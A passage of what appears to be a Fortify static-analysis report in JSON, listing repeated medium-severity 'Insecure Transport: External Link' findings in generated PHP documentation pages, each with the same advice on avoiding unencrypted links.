http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4610/?engineType=SCA&issue=9A0CF12233A5B440DCC7ADA201669E90"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4611",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Session.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4611/?engineType=SCA&issue=9A0CF12233A5B440DCC7ADA201669E91"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4612",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Session.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4612/?engineType=SCA&issue=9A0CF12233A5B440DCC7ADA201669E92"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4613",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Session.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4613/?engineType=SCA&issue=9A0CF12233A5B440DCC7ADA201669E93"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4460",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Converter.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4460/?engineType=SCA&issue=40BCC4C23C1DBDE2057F0A5927F3B378"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4461",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Converter.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4461/?engineType=SCA&issue=40BCC4C23C1DBDE2057F0A5927F3B379"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4462",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Converter.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4462/?engineType=SCA&issue=40BCC4C23C1DBDE2057F0A5927F3B37A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4399",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Event.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4399/?engineType=SCA&issue=18FBE4CC6AD19A5632CCE7131B37B927"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4400",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Event.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4400/?engineType=SCA&issue=18FBE4CC6AD19A5632CCE7131B37B928"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4401",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Event.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4401/?engineType=SCA&issue=18FBE4CC6AD19A5632CCE7131B37B929"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4674",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter---Filter.php.html on line 60 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4674/?engineType=SCA&issue=C7BE5FADA79D6F1351CD48AF813A83AA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4599",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter---Storage---Abstract.php.html on line 60 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4599/?engineType=SCA&issue=94EE0E096812910A1403E938CBB3155D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4595",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter---Storage.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4595/?engineType=SCA&issue=93D3157BB9AE1B5A098EFCD7EFD3D315"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4596",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter---Storage.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4596/?engineType=SCA&issue=93D3157BB9AE1B5A098EFCD7EFD3D316"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4597",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter---Storage.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4597/?engineType=SCA&issue=93D3157BB9AE1B5A098EFCD7EFD3D317"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4746",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4746/?engineType=SCA&issue=F604C58EE6F3ACCB8DFC2A6D51ACE02D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4747",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4747/?engineType=SCA&issue=F604C58EE6F3ACCB8DFC2A6D51ACE02E"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4748",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Filter.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4748/?engineType=SCA&issue=F604C58EE6F3ACCB8DFC2A6D51ACE02F"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4616",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Init.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4616/?engineType=SCA&issue=9DA53B44ACB05365925216882B36B21A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4617",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Init.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4617/?engineType=SCA&issue=9DA53B44ACB05365925216882B36B21B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4618",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Init.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4618/?engineType=SCA&issue=9DA53B44ACB05365925216882B36B21C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4409",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Composite.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4409/?engineType=SCA&issue=1E3DCDFDA9CE641A84F0CAD5F87D6B84"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4410",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Composite.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4410/?engineType=SCA&issue=1E3DCDFDA9CE641A84F0CAD5F87D6B85"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4411",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Composite.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
